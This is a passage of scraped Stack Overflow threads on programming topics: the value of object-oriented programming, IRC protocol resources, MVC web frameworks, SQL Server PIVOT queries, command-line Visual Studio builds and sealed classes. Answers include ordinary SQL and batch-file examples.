<p>Clients use the same set of calls regardless of whether they are talking to a local file system, a remote Network File System (NFS) or (today) fake file systems (e.g. /proc).</p>

<p>See the original Sun paper:  Vnodes: An Architecture for Multiple File System Types in Sun UNIX </p>
 <p>Will we say the same things ten years from now about functional programming? </p>
 <p>I don't care for reuse as much as I do for readability. The latter means your code is easier to change. That alone is worth in gold in the craft of building software.</p>

<p>And OO is a pretty damn effective way to make your programs readable. Reuse or no reuse.</p>
 <p>The problem with OOP is that it was oversold.</p>

<p>As Alan Kay originally conceived it, it was a great alternative to the prior practice of having raw data and all-global routines.</p>

<p>Then some management-consultant types latched onto it and sold it as the messiah of software, and lemming-like, academia and industry tumbled along after it.</p>

<p>Now they are lemming-like tumbling after other good ideas being oversold, such as functional programming.</p>

<p>So what would I do differently? Plenty, and I wrote a book on this. (It's out of print - I don't get a cent, but you can still get copies.)<a href=""http://rads.stackoverflow.com/amzn/click/0442017405"">Amazon</a></p>

<p>My constructive answer is to look at programming not as a way of modeling things in the real world, but as a way of encoding requirements.</p>

<p>That is very different, and is based on information theory (at a level that anyone can understand). It says that programming can be looked at as a process of defining languages, and skill in doing so is essential for good programming.</p>

<p>It elevates the concept of domain-specific-languages (DSLs). It agrees emphatically with DRY (don't repeat yourself). It gives a big thumbs-up to code generation. It results in software with massively less data structure than is typical for modern applications.</p>

<p>It seeks to re-invigorate the idea that the way forward lies in inventiveness, and that even well-accepted ideas should be questioned.</p>
 <p>The real world isn't ""OO"". The real world is not largely structured from sensible pieces. Instead it's made from chaotically moving particles. The earth is a particle soup. Still people see birds, trees, sky, ground, forests, ponds. OO is about abstraction of program components. It's fundamentally flawed to think about OO for modelling something else than programs.</p>

<p>All the money and time failed to make software any better, because it failed to make programmers smarter, also because it failed to change the way how people think about software. ""OOP"" in the sense you use it is a buzzword used to get the money out from
idiots. Yes, people who have put money on ""OOP"" education and tools are idiots. People who tend to fall on hoaxes tend to be idiots.</p>

<p>The value of ""OOP"" is the abstraction and the code reuse <em>inside the same program</em>. OOP is meant to be used with imperative programs.</p>

<p>If you get up from assembly routines. Assembly is an ordered sequences of pairs composed from labels and instructions. Assembly code is similar to the 'particle soup'. Now you can move to the subroutine. Subroutine picks a label from that label:instruction -soup, and hides the rest of labels inside the subroutine. As the effect code becomes more abstract and your namespace stays cleaner.</p>

<p>Now, if you think what subroutines do... Few of decades ago people were thinking that subroutines are at their best when they work on the arguments. That made them to give each object it's own protocol. Protocol would contain label:procedure -pairs. Now called selector:method -pairs. Procedures weren't bound directly to the other procedures anymore, explaining the 'late binding' -term. Along with keeping the history from the protocols (inheritance), this formed the 'object orientation' in the smalltalk.</p>

<p>You've been incapacitated the late binding mechanism and forgotten what inheritance means. And you yet wonder what you are missing there. ""Where's the value of OOP, and why has all the time and money failed to make software any better?"" - I think you stuffed them into your arse. When you attempt to colonoscopy you will find them.</p>
 <p>In the first place, the observations are somewhat sloppy.  I don't have any figures on software productivity, and have no good reason to believe it's not going up.  Further, since there are many people who abuse OO, good use of OO would not necessarily cause a productivity improvement even if OO was the greatest thing since peanut butter.  After all, an incompetent brain surgeon is likely to be worse than none at all, but a competent one can be invaluable.</p>

<p>That being said, OO is a different way of arranging things, attaching procedural code to data rather than having procedural code operate on data.  This should be at least a small win by itself, since there are cases where the OO approach is more natural.  There's nothing stopping anybody from writing a procedural API in C++, after all, and so the option of providing objects instead makes the language more versatile.</p>

<p>Further, there's something OO does very well:  it allows old code to call new code automatically, with no changes.  If I have code that manages things procedurally, and I add a new sort of thing that's similar but not identical to an earlier one, I have to change the procedural code.  In an OO system, I inherit the functionality, change what I like, and the new code is automatically used due to polymorphism.  This increases the locality of changes, and that is a Good Thing.</p>

<p>The downside is that good OO isn't free:  it requires time and effort to learn it properly.  Since it's a major buzzword, there's lots of people and products who do it badly, just for the sake of doing it.  It's not easier to design a good class interface than a good procedural API, and there's all sorts of easy-to-make errors (like deep class hierarchies).</p>

<p>Think of it as a different sort of tool, not necessarily generally better.  A hammer in addition to a screwdriver, say.  Perhaps we will eventually get out of the practice of software engineering as knowing which wrench to use to hammer the screw in.</p>
 <p>There are already a lot of answers on this as this is an old post but i thought i'd chime in.</p>

<p>You mention ""class taxonomy"" a bit which gets into subtyping and polymorphism.  This all revolves around inheritance which in it heyday was considered the silver bullet of OOP.  Nowadays, inheritance and large class hierarchies are actually discouraged, even among shops that do a lot of OOP.  This is because the other pricinples of OOP, such as encapsulation, loose coupling, cohesion and so forth have been found to be far more useful than inheritance.  I would even go so far to say that loose coupling is the reason for OO, not code reuse.  Code reuse usually happens at the method/function level.  I do sometimes reuse classes under different circumstances, but not that often.  Loose coupling though helps organize a system quite a bit.  Each object has its own scope, the data in the object isn't or should not be manipulated except by accessor methods or properties, each object should do one simple thing and should talk to other objects thru simple interfaces.  This handful of principles helps code readability, helps isolate bugs and prevent you from having to make many changes in lots of different places to change one thing.  When objects are not closely intertwined, you can change one without affecting others.  This has been a huge benefit to me.  Inheritance is useful only now and then.</p>

<p>Code reuse is still important and if you are copying and pasting or rewriting the same code, thats a bad practice even under plain old procedural, structured or functional programming.  That actually increases costs due to duplicated effort, increased maintenance and more bugs.  </p>
 <p>From my experience which started in C/Unix (non OOP) in the mid 1980s then moving onto C++ (OOP) in 1990 and then into Java around 1996 (OOP) I have found OOP to give a massive boost to productivity, maintainability and robustness compared with the large non OOP programs I was working on earlier.</p>

<p>The main thing I have observed is that in non OOP applications I have worked on the complexity seemed to grow at an exponential rate with respect to the sophistication of the application whereas in the OOP applications I worked on the complexity seemed to have a much more linear relationship with repect to the sophistication of the application.</p>

<p>In other words - with well designed OOP applications you never get that ""OMG the source code for this app is getting waaaaay out of control"" feeling that you get with large non OOP applications.</p>

<p>The other things I can't do without as an OOP developer is the way I can write code that models the real world entities that exist in the application's problem domain. Objects take on a life of their own - way beyond what any structs (C) or Records (Pascal) did back in the bad old =] non OOP days.</p>

<p>The one stipulation is that the chief architect of an OOP project must know what he's doing and he has to usually put more thinking time into getting the design right than in actually implementing it but the payback for 'thinking things through up front' is truly amazing. Opportunities for reuse or awesomely cool design optimizations come to light that have you punching the air and doing touchdowns in the office... ok, that might look a bit strange to the others in the office but that kind of enthusiasm never happened in the non OOP days :)</p>

<p>I've seen some pretty badly written OOP code and maybe that's what you've experienced which may have lead you to ask the question. As a contractor in the mid 90s I often found that the 'OO' design had already been started by someone who knew what a class was but not much more. It was a very painful experience and I often found that my first few months in a job involved educating the team in the very different way of 'OO' thinking. It was only after everyone's brain had been rewired that we could all proceed as a team to create something awesome.</p>

<p>Many people find the 'brain rewiring' process too hard, painful or just too much effort and so spend their life dissin' OOP and so you'll find a lot of OO haters out there but I'm happy about that because it's those people that make people like me look good: ""What, you can do it for $X and it will be ready in 2 months and you will give us a maintainable code base!!! Wow, can you start today?""</p>
 <p>Real world may not be OO but people tend to learn or think better with analogy (abstraction) rather than logic. </p>

<p>OOP is not for computer but it's for programmer who is poor at figuring out a complex system without analogy. I believe main purpose of OOP is better organization of code using abstraction so without knowledge of other parts, a programmer can easily understand what specific part of or whole system does in a level she/he want to be in. </p>

<p>To organize the code with abstraction, you will need encapsulation, inheritance, and polymorphism as well in your language. And SOLID OOP principles and design patterns come in to do better job at this organization.  But I think whole point of OOP is abstraction because human thinks better in that way.</p>
 <p>OOP is about instancing...  you want to reinstance the same thing over and over again, with a slightly different classification of its activity.  shared activity means a shared class.</p>

<p>If you dont want to think in that way, dont do OOP.  it definitely twists the mind to start thinking about it after say pascal, hence the pissed off programmers.</p>

<p>You detail your instancing robot to the every last difference, and you dont repeat yourself once.</p>

<p>You only have 1 label/class for every classification difference (not every different thing!),  thats the power of OOP...  and thats how its similar to some super nueral network for ai, that never runs out of names for different things, because it relies apon the total distribution, to name it.</p>

<p>-Magnus W.</p>
"
"Programming a simple IRC (Internet-Relay-Chat) Client <p>I started using IRC at a young age, and I have always been fascinated with it.  As a language exercise, I was thinking about programming a simple IRC client in Ruby with <a href=""http://www.shoooes.net/"">Shoes</a> as a graphical front-end.  My question to you, kind-sirs, what do I need to become familiar with to start on this great adventure (besides shoes and Ruby of course)?  I imagine there is some-sort of specification on IRC Protocol.  Any pointers?</p>
 <p>The IRC Specification is laid out in RFC 1459</p>

<p><a href=""http://www.irchelp.org/irchelp/rfc/rfc.html"" rel=""nofollow"">http://www.irchelp.org/irchelp/rfc/rfc.html</a></p>
 <blockquote>
  <p>I found this gem on Wikipedia. Sounds intimidating.</p>
</blockquote>

<p>It's actually not.</p>

<p>Telnet onto an IRC Server and witness the simplicity of the protocol first hand. The hardest part is the handshake, after that its very simple.</p>
 <p>I once implemented a client and a server with 2 more guys (as part of a course).<br />
I can tell you that the RFC you were already linked to is great.<br />
I'd also try simply sniffing a connection with an existing client to see for yourself how stuff work.</p>
 <p>Not exactly an answer to your question, but it may be helpful. If you are using Ruby, I have found the Autumn Leaves project to be a great way to build an IRC bot using Ruby:</p>

<p><a href=""http://github.com/RISCfuture/autumn/tree/master"" rel=""nofollow"">http://github.com/RISCfuture/autumn/tree/master</a></p>

<p>It is pretty much the Jibble of the Ruby world.</p>
 <p>An earlier post mentioned RFC1459. While it is a very good introduction to IRC, it has actually been superseded by RFCs 2810-2813. Here is a more complete list of documentation you need to program anything IRC-related:</p>

<ul>
<li><a href=""http://tools.ietf.org/html/rfc1459"">RFC1459</a> (original RFC; superseded, but still useful)</li>
<li><a href=""http://tools.ietf.org/html/rfc2810"">RFC2810</a> (IRC architecture)</li>
<li><a href=""http://tools.ietf.org/html/rfc2811"">RFC2811</a> (IRC channel management)</li>
<li><a href=""http://tools.ietf.org/html/rfc2812"">RFC2812</a> (IRC client protocol)</li>
<li><a href=""http://tools.ietf.org/html/rfc2813"">RFC2813</a> (IRC server protocol)</li>
<li><a href=""http://www.irchelp.org/irchelp/rfc/ctcpspec.html"">CTCP specification</a></li>
<li><a href=""http://www.irchelp.org/irchelp/rfc/dccspec.html"">DCC specification</a></li>
<li><a href=""http://www.invlogic.com/irc/ctcp.html"">Updated CTCP specification</a> (not all clients support this)</li>
<li><a href=""http://www.irc.org/tech_docs/draft-brocklesby-irc-isupport-03.txt"">ISupport (response code 005) draft</a> (almost all servers support this nowadays)</li>
<li><a href=""http://www.leeh.co.uk/draft-mitchell-irc-capabilities-02.html"">Client capabilities (CAP command) draft</a> (supported by some servers/clients)</li>
<li><a href=""http://ircv3.org/"">IRCv3 standards and proposals</a> (the future features of IRC, some of which are already widely supported)</li>
</ul>
"
"What are the best MVC web frameworks on the market? <p>I am looking for a Web Framework to move windows based applications to the web.</p>

<p>The main requirements to WF are the following:</p>

<ol>
<li>unit tests support</li>
<li>desktop and mobile browsers support</li>
<li>long term viability</li>
<li>maturity of the framework</li>
</ol>
 <p>How about the <a href=""http://www.asp.net/mvc/"" rel=""nofollow"">ASP.NET MVC framework</a>?  It's what this site is running on.</p>

<p>Another more mature option is <a href=""http://www.castleproject.org/projects/monorail/"" rel=""nofollow"">Castle MonoRail</a>.  </p>

<p>I think ASP.NET MVC is probably the best choice in the long run.  A year from now, it will be far easier to hire someone who knows ASP.NET MVC than someone who knows MonoRail.</p>
 <p>I heavily prefer <a href=""http://www.cakephp.org/"">CakePHP</a> for PHP, <a href=""http://www.djangoproject.com/"">Django</a> for Python, <a href=""http://www.rubyonrails.org/"">Rails</a> for Ruby.</p>

<p>In terms of front-end, if you're looking for a desktop-esque end user experience you should look into <a href=""http://www.extjs.com/"">ExtJS</a> or <a href=""http://developer.yahoo.com/yui/"">YUI</a>.</p>
 <p>In my opinion, with contributions from the SO community</p>

<ul>
<li><a href=""http://zendframework.com/"">Zend Fraemwork</a> for PHP</li>
<li><a href=""http://www.djangoproject.com/"">Django</a> for Python</li>
<li><a href=""http://rubyonrails.org"">Rails</a> for Ruby</li>
<li><a href=""http://merbivore.com/"">Merb</a> for Ruby (for the experienced)</li>
<li><a href=""http://www.asp.net/mvc/"">ASP.NET MVC</a> for .NET</li>
<li><a href=""http://www.seaside.st/"">Seaside</a> for Smalltalk</li>
<li><a href=""http://catalystframework.org"">Catalyst</a> for Perl</li>
</ul>
 <p>if you're a java progammer, check out the <a href=""http://struts.apache.org/"" rel=""nofollow"">Struts</a> framework by the Apache folks.</p>
 <p>I have been using Struts from Jakarta (Apache group) for java, and it's really good. Good separation of the layers, which allows you use any othe library/framework in any layer, for example Hibernate for object-relational mapping or even any template framework like Velocity in the view layer.</p>

<p>I recommend you give a look at their <a href=""http://struts.apache.org/2.0.11.2/index.html"" rel=""nofollow"">website</a></p>
 <p>Rails is still ahead of the competitors as a complete stack with large community driving it forward.</p>
 <p>Another alternative would be <a href=""http://www.sproutcore.com/"" rel=""nofollow"">SproutCore</a>, which is entirely client-side. The project is still in its infancy, however.</p>
 <p>I recommend the Java based <a href=""http://wicket.apache.org/"">Wicket</a> Framework. </p>

<p>It's a component based MVC library which is really easy to use and allows to do all the view stuff in the java code (in contrast to using JSPs or templates or whatever in other frameworks).</p>
 <p>I've had surprising success using <a href=""http://drupal.org/"" rel=""nofollow"">Drupal</a> as a web app framework.  It's highly extensible - pretty much every default behaviour can be overridden easily via modules, and it's a pretty blank slate to start with as well.</p>

<p>Drupal 7 has <a href=""http://drupal.org/project/simpletest"" rel=""nofollow"">unit testing built-in, and earlier versions can do it easily via a plugin</a>.</p>
 <p>ASP.NET MVC will probably be the de facto standard on the .NET platform. Also, MonoRail has been around for quite a while and still <a href=""http://www.castleproject.org/MonoRail/faq.html"" rel=""nofollow"">doesn't support caching</a>. It seems like a very difficult thing to do, and is a major drawback if you ask me.</p>
 <p>If you are curious about <a href=""http://www.seaside.st"" rel=""nofollow"">Seaside</a> (mentioned by yinkei), visit Randal Schwartz's <a href=""http://methodsandmessages.vox.com/library/posts/tags/seaside/page/2/"" rel=""nofollow"">Methods and Messages</a>. You can start by watching his quick <a href=""http://methodsandmessages.vox.com/library/video/6a00e398cc856f000500f48cf7b3190002.html"" rel=""nofollow"">elevator pitch</a>.</p>

<p>Seaside creator Avi Bryant's <a href=""http://www.infoq.com/interviews/bryant-smalltalk-dabbledb"" rel=""nofollow"">interview</a> is also a good read/watch.</p>

<p>Working with Seaside was amazing for me, almost like coding a desktop app.</p>

<p>Visit <a href=""http://www.dabbledb.com"" rel=""nofollow"">Dabble DB</a> and <a href=""http://www.cmsbox.com/"" rel=""nofollow"">Cmsbox</a> for real life apps built on Seaside.</p>
 <p>Why haven't anyone talked about <a href=""http://www.turbogears.org"" rel=""nofollow"">turbogears</a>, <a href=""http://webpy.org"" rel=""nofollow"">web.py</a> and <a href=""http://www.pylonshq.com"" rel=""nofollow"">pylons</a>?</p>
 <p>For Python, I recommend <a href=""http://pylonshq.com/"" rel=""nofollow"">Pylons</a> (<a href=""http://docs.pylonshq.com/"" rel=""nofollow"">docs</a>) (<a href=""http://pylonsbook.com/"" rel=""nofollow"">book</a>)</p>
 <p>Honestly if you want an MVC framework for asp.net I would pick <a href=""http://www.castleproject.org/monorail/index.html"" rel=""nofollow"">Castle Monorail</a>. I think it is more mature then the current MVC framework from microsoft.</p>
 <p>I have been using Wicket for about a year and it is fantastic.  It's java based, supports unit tests, and uses a very flexible templating system for display.</p>
 <p>The Spring projects WebMVC framework is very good, more so than Struts. I've also heard very good things about Grails which uses Groovy on top of Spring and is modeled after Ruby on Rails.</p>
 <p>No-one seems to have mentioned Perl, and the Catalyst framework available for it. It ticks all the boxes in your requirement list.</p>

<p><a href=""http://catalystframework.org"" rel=""nofollow"">http://catalystframework.org</a></p>
 <p>For Java, I recommend the open source framework: (µ)Micro. The code is on <a href=""https://github.com/florinpatrascu/micro"" rel=""nofollow"">Github</a> and this is the web site containing the docs: <a href=""http://micro-docs.simplegames.ca/"" rel=""nofollow"">http://micro-docs.simplegames.ca/</a>, a work in progress.</p>

<p>I am the author of this framework and I welcome your feedback, thanks!</p>
 <p>If we're talking ""Best"" I'm throwing in <a href=""http://www.sinatrarb.com/"" rel=""nofollow"">Sinatra</a> for Ruby and <a href=""http://nancyfx.org/"" rel=""nofollow"">Nancy</a> for .Net. Based 100% on my subjective opinion and personal preferences. They are <em>my best</em> based on their ease of use and ""happiness factor"". </p>
"
"SQL Server: Examples of PIVOTing String data <p>Trying to find some simple SQL Server PIVOT examples.  Most of the examples that I have found involve counting or summing up numbers.  I just want to pivot some string data.  For example, I have a query returning the following.</p>

<pre><code>Action1 VIEW  
Action1 EDIT  
Action2 VIEW  
Action3 VIEW  
Action3 EDIT  
</code></pre>

<p>I would like to use PIVOT (if even possible) to make the results like so:</p>

<pre><code>Action1 VIEW EDIT  
Action2 VIEW NULL  
Action3 VIEW EDIT  
</code></pre>

<p>Is this even possible with the PIVOT functionality?</p>
 <p>Well, for your sample and any with a limited number of unique columns, this should do it.</p>

<pre><code>select 
    distinct a,
    (select distinct t2.b  from t t2  where t1.a=t2.a and t2.b='VIEW'),
    (select distinct t2.b from t t2  where t1.a=t2.a and t2.b='EDIT')
from t t1
</code></pre>
 <p>Remember that the MAX aggregate function will work on text as well as numbers. This query  will only require the table to be scanned once.</p>

<pre><code>SELECT Action,
       MAX( CASE data WHEN 'View' THEN data ELSE '' END ) ViewCol, 
       MAX( CASE data WHEN 'Edit' THEN data ELSE '' END ) EditCol
 FROM t
 GROUP BY Action
</code></pre>
 <p>If you specifically want to use the SQL Server PIVOT function, then this should work, assuming your two original columns are called act and cmd. (Not that pretty to look at though.)</p>

<pre><code>SELECT act AS 'Action', [View] as 'View', [Edit] as 'Edit'
FROM (
    SELECT act, cmd FROM data
) AS src
PIVOT (
    MAX(cmd) FOR cmd IN ([View], [Edit])
) AS pvt
</code></pre>
 <p>From <a href=""http://blog.sqlauthority.com/2008/06/07/sql-server-pivot-and-unpivot-table-examples/"" rel=""nofollow"">http://blog.sqlauthority.com/2008/06/07/sql-server-pivot-and-unpivot-table-examples/</a>:</p>

<pre><code>SELECT CUST, PRODUCT, QTY
FROM Product) up
PIVOT
( SUM(QTY) FOR PRODUCT IN (VEG, SODA, MILK, BEER, CHIPS)) AS pvt) p
UNPIVOT
(QTY FOR PRODUCT IN (VEG, SODA, MILK, BEER, CHIPS)
) AS Unpvt
GO
</code></pre>
 <p>Table setup:</p>

<pre><code>CREATE TABLE dbo.tbl (
    action VARCHAR(20) NOT NULL,
    view_edit VARCHAR(20) NOT NULL
);

INSERT INTO dbo.tbl (action, view_edit)
VALUES ('Action1', 'VIEW'),
       ('Action1', 'EDIT'),
       ('Action2', 'VIEW'),
       ('Action3', 'VIEW'),
       ('Action3', 'EDIT');
</code></pre>

<p>Your table: 
<code>SELECT action, view_edit FROM dbo.tbl</code></p>

<p><img src=""http://i.stack.imgur.com/UrEJU.jpg"" alt=""Your table"">
<br/></p>

<p><strong>Query without using PIVOT:</strong> <br></p>

<pre><code>SELECT Action, 
[View] = (Select view_edit FROM tbl WHERE t.action = action and view_edit = 'VIEW'),
[Edit] = (Select view_edit FROM tbl WHERE t.action = action and view_edit = 'EDIT')
FROM tbl t
GROUP BY Action
</code></pre>

<p><strong>Query using PIVOT:</strong> <br></p>

<pre><code>SELECT [Action], [View], [Edit] FROM
(SELECT [Action], view_edit FROM tbl) AS t1 
PIVOT (MAX(view_edit) FOR view_edit IN ([View], [Edit]) ) AS t2
</code></pre>

<p><strong>Both queries result:</strong> <br/>
<img src=""http://i.stack.imgur.com/fakmf.jpg"" alt=""enter image description here""></p>
 <pre><code>With pivot_data as
(
select 
action, -- grouping column
view_edit -- spreading column
from tbl
)
select action, [view], [edit]
from   pivot_data
pivot  ( max(view_edit) for view_edit in ([view], [edit]) ) as p;
</code></pre>
"
"How do you automate a Visual Studio build? <p>How do you turn a Visual Studio build that you'd perform in the IDE into a script that you can run from the command line?</p>
 <p>Look into  build tool <a href=""http://en.wikipedia.org/wiki/NAnt"" rel=""nofollow"">NAnt</a> or <a href=""http://en.wikipedia.org/wiki/MSBuild"" rel=""nofollow"">MSBuild</a>. I believe MSBuild is the build tool for Visual&nbsp;Studio&nbsp;2005 and later. I am, however, a fan of NAnt...</p>
 <p>Simplest way: navigate to the directory containing the solution or project file, and run <code>msbuild</code> (assuming you have Visual Studio 2005 or newer).</p>

<p>More flexible ways:</p>

<ul>
<li>Read up on <a href=""http://msdn.microsoft.com/en-us/library/0k6kkbsd.aspx"" rel=""nofollow"">the MSBuild
reference</a>. There are tons of
customization, especially once
you've installed the <a href=""https://github.com/loresoft/msbuildtasks"" rel=""nofollow"">MSBuild Community Tasks Project</a>.  </li>
<li>Use <a href=""http://en.wikipedia.org/wiki/NAnt"" rel=""nofollow"">NAnt</a>. It has existed
for longer than MSBuild and has more
community support, but requires you
to start a project file from
scratch, rather than extending the
existing, Visual Studio-created one.</li>
</ul>
 <pre><code>\Windows\Microsoft.NET\Framework\[YOUR .NET VERSION]\msbuild.exe
</code></pre>

<p>Lots of command line parameters, but the simplest is just:</p>

<pre><code>msbuild.exe yoursln.sln
</code></pre>
 <p><strong><a href=""http://en.wikipedia.org/wiki/NAnt"" rel=""nofollow"">NAnt</a></strong> and <strong><a href=""http://en.wikipedia.org/wiki/MSBuild"" rel=""nofollow"">MSBuild</a></strong> are the most popular tools to automate your build in <a href=""http://en.wikipedia.org/wiki/.NET_Framework"" rel=""nofollow"">.NET</a>, and you can find a discussion on there of the pros/cons of each in the Stack Overflow question <em><a href=""http://stackoverflow.com/questions/16550"">Best .NET build tool</a></em>.</p>
 <p>I had to do this for a C++ project in Visual Studio <strong>2003</strong> so I don't know how relevant this is to later version of visual studio:</p>

<p>In the directory where your executable is created there will be a <code>BuildLog.htm</code> file. Open that file in your browser and then for each section such as:</p>

<pre><code>Creating temporary file ""c:\some\path\RSP00003C.rsp"" with contents
[
/D ""WIN32"" /D ""_WINDOWS"" /D ""STRICT"" /D ""NDEBUG"" ..... (lots of other switches)
.\Project.cpp
.\Another.cpp
.\AndAnother.cpp
"".\And Yet Another.cpp""
]
Creating command line ""cl.exe @c:\some\path\RSP00003C.rsp /nologo""
</code></pre>

<p>create a .rsp file with the content between the square brackets (but not including the square brackets) and call it whatever you like. I seem to remember having problems with absolute paths so you may have to make sure all the paths are relative.</p>

<p>Then in your build script add the command line from the <code>BuildLog.htm</code> file but with your .rsp filename:</p>

<pre><code>cl.exe @autobuild01.rsp /nologo
</code></pre>

<p>(note there will also be a link.exe section as well as cl.exe)</p>
 <p>As of <a href=""http://en.wikipedia.org/wiki/Microsoft_Visual_Studio#Visual_Studio_2005"" rel=""nofollow"">Visual&nbsp;Studio&nbsp;2005</a>, all of the project files (at least for .NET based projects) are actual <a href=""http://en.wikipedia.org/wiki/MSBuild"" rel=""nofollow"">MSBuild</a> files, so you can call MSBuild on the command line and pass it the project file.</p>

<p>The bottom line is that you need to use a ""build scripting language"" like <a href=""http://en.wikipedia.org/wiki/NAnt"" rel=""nofollow"">NAnt</a> or MSBuild (there are others, but these are the mainstream ones right now) if you want to have any real control over your build process.</p>
 <p>With VS2008 you can do this:</p>

<pre><code>devenv solution.sln /build configuration
</code></pre>
 <p>Take a look at UppercuT. It has a lot of bang for your buck and it does what you are looking for and much more.</p>

<p>UppercuT uses NAnt to build and it is the insanely easy to use Build Framework.</p>

<p>Automated Builds as easy as (1) solution name, (2) source control path, (3) company name for most projects!</p>

<p><a href=""http://projectuppercut.org"" rel=""nofollow"">http://projectuppercut.org/</a></p>

<p>Some good explanations here: <a href=""http://ferventcoder.com/category/uppercut.aspx"" rel=""nofollow"">UppercuT</a></p>
 <p>Here is my batch file using <strong>msbuild</strong> for VS <strong>2010</strong> Debug configuration:</p>

<pre><code>""C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe"" 
iTegra.Web.sln /p:Configuration=Debug /clp:Summary /nologo
</code></pre>
 <p>Here is the script I'm using to completely automate the command line build of x86 AND x64 configurations for the same solution through batch scripts.</p>

<p>This is based on DevEnv.exe as it works if you have a Setup project in your build (msbuild doesn't support building Setup projects).</p>

<p>I'm assuming your setup is 32bit Windows 7 with Visual Studio 2010 setup using the x86 native compiler and x64 cross compiler.
If you're running 64bit windows you may need to change <em>x86_amd64</em> to <em>amd64</em> in the batch script depending on your setup.
This is assuming Visual Studio is installed in <em>Program Files</em> and your solution is located in <em>D:\MySoln</em></p>

<p>Create a file called <em>buildall.bat</em> and add this to it:</p>

<pre><code>D:
cd ""D:\MySoln""

if ""%1"" == """" goto all
if %1 == x86 goto x86
if %1 == x64 goto x64

:x86
%comspec% /k """"C:\Program Files\Microsoft Visual Studio 10.0\VC\vcvarsall.bat"""" x86 &lt; crosscompilex86.bat
goto eof

:x64
%comspec% /k """"C:\Program Files\Microsoft Visual Studio 10.0\VC\vcvarsall.bat"""" x86_amd64 &lt; crosscompilex64.bat
goto eof

:all
%comspec% /k """"C:\Program Files\Microsoft Visual Studio 10.0\VC\vcvarsall.bat"""" x86 &lt; crosscompilex86.bat
if %ERRORLEVEL% NEQ 0 goto eof
%comspec% /k """"C:\Program Files\Microsoft Visual Studio 10.0\VC\vcvarsall.bat"""" x86_amd64 &lt; crosscompilex64.bat
goto eof

:eof
pause
</code></pre>

<p>Now create 2 more batch scripts:</p>

<p><em>crosscompilex86.bat</em> to build the Release version of a x86 build and include this</p>

<pre><code>devenv MySoln.sln /clean ""Release|x86""
IF %ERRORLEVEL% NEQ 0 EXIT /B %ERRORLEVEL%
devenv MySoln.sln /rebuild ""Release|x86""
IF %ERRORLEVEL% NEQ 0 EXIT /B %ERRORLEVEL%
</code></pre>

<p><em>crosscompilex64.bat</em> to build the Release version of the x64 build and include this</p>

<pre><code>devenv MySoln.sln /clean ""Release|x64""
IF %ERRORLEVEL% NEQ 0 EXIT /B %ERRORLEVEL%
devenv MySoln.sln /rebuild ""Release|x64""
IF %ERRORLEVEL% NEQ 0 EXIT /B %ERRORLEVEL%
</code></pre>

<p>Now place all 3 batch files along in your solution folder along with MySoln.sln.
You can build both x86 and x64 Release versions by creating a Shortcut on your desktop which run the following commands:</p>

<ul>
<li>Build All -> <em>D:\MySoln\buildall.bat</em></li>
<li>Build x86 Release Only -> <em>D:\MySoln\buildall.bat x86</em></li>
<li>Build x64 Release Only -> <em>D:\MySoln\buildall.bat x64</em></li>
</ul>

<p>If you're using another configuration like AnyCPU etc you would need to customize the above scripts accordingly.</p>
"
"Why should you prevent a class from being subclassed? <p>What can be reasons to prevent a class from being inherited? (e.g. using sealed on a c# class)
Right now I can't think of any.</p>
 <p>How about if you are not sure about the interface yet and don't want any other code depending on the present interface? [That's off the top of my head, but I'd be interested in other reasons as well!]</p>

<p>Edit:
A bit of googling gave the following:
<a href=""http://codebetter.com/blogs/patricksmacchia/archive/2008/01/05/rambling-on-the-sealed-keyword.aspx"" rel=""nofollow""><a href=""http://codebetter.com/blogs/patricksmacchia/archive/2008/01/05/rambling-on-the-sealed-keyword.aspx"" rel=""nofollow"">http://codebetter.com/blogs/patricksmacchia/archive/2008/01/05/rambling-on-the-sealed-keyword.aspx</a></a></p>

<p>Quoting:</p>

<p>There are three reasons why a sealed class is better than an unsealed class:</p>

<ul>
<li><strong>Versioning</strong>: When a class is originally sealed, it can change to unsealed in the future without breaking compatibility. (…)</li>
<li><strong>Performance</strong>: (…) if the JIT compiler sees a call to a virtual method using a sealed types, the JIT compiler can produce more efficient code by calling the method non-virtually.(…)</li>
<li><strong>Security and Predictability</strong>: A class must protect its own state and not allow itself to ever become corrupted. When a class is unsealed, a derived class can access and manipulate the base class’s state if any data fields or methods that internally manipulate fields are accessible and not private.(…)</li>
</ul>
 <p>Because writing classes to be substitutably extended is <em>damn hard</em> and requires you to make accurate predictions of how future users will want to extend what you've written.</p>

<p>Sealing your class forces them to use composition, which is much more robust.</p>
 <p>This may not apply to your code, but a lot of classes within the .NET framework are sealed purposely so that no one tries to create a sub-class.</p>

<p>There are certain situations where the internals are complex and require certain things to be controlled very specifically so the designer decided no one should inherit the class so that no one accidentally breaks functionality by using something in the wrong way.</p>
 <p>Because you always want to be handed a reference to the class and not to a derived one for various reasons:<br />
i. invariants that you have in some other part of your code<br />
ii. security<br />
etc</p>

<p>Also, because it's a safe bet with regards to backward compatibility - you'll never be able to close that class for inheritance if it's release unsealed.</p>

<p>Or maybe you didn't have enough time to test the interface that the class exposes to be sure that you can allow others to inherit from it.</p>

<p>Or maybe there's no point (that you see now) in having a subclass.  </p>

<p>Or you don't want bug reports when people try to subclass and don't manage to get all the nitty-gritty details - cut support costs.</p>
 <p>@jjnguy</p>

<blockquote>
  <p>Another user may want to re-use your code by sub-classing your class. I don't see a reason to stop this.</p>
</blockquote>

<p>If they want to use the functionality of my class they can achieve that with containment, and they will have much less brittle code as a result.</p>

<p>Composition seems to be often overlooked; all too often people want to jump on the inheritance bandwagon. They should not! Substitutability is difficult. Default to composition; you'll thank me in the long run.</p>
 <p>Sometimes your class interface just isn't meant to be inheirited.  The public interface just isn't virtual and while someone could override the functionality that's in place it would just be wrong.  Yes in general they shouldn't override the public interface, but you can insure that they don't by making the class non-inheritable.  </p>

<p>The example I can think of right now are customized contained classes with deep clones in .Net.  If you inherit from them you lose the deep clone ability.[I'm kind of fuzzy on this example, it's been a while since I worked with IClonable]  If you have a true singelton class, you probably don't want inherited forms of it around, and a data persistence layer is not normally place you want a lot of inheritance.</p>
 <p>I want to give you this message from ""Code Complete"":</p>

<blockquote>
  <p>Inheritance - subclasses - tends to
  work against the primary technical
  imperative you have as a programmer,
  which is to manage complexity.For the sake of controlling complexity, you should maintain a heavy bias against inheritance.</p>
</blockquote>
 <p>I am in agreement with jjnguy... I think the reasons to seal a class are few and far between.  Quite the contrary, I have been in the situation more than once where I want to extend a class, but couldn't because it was sealed.</p>

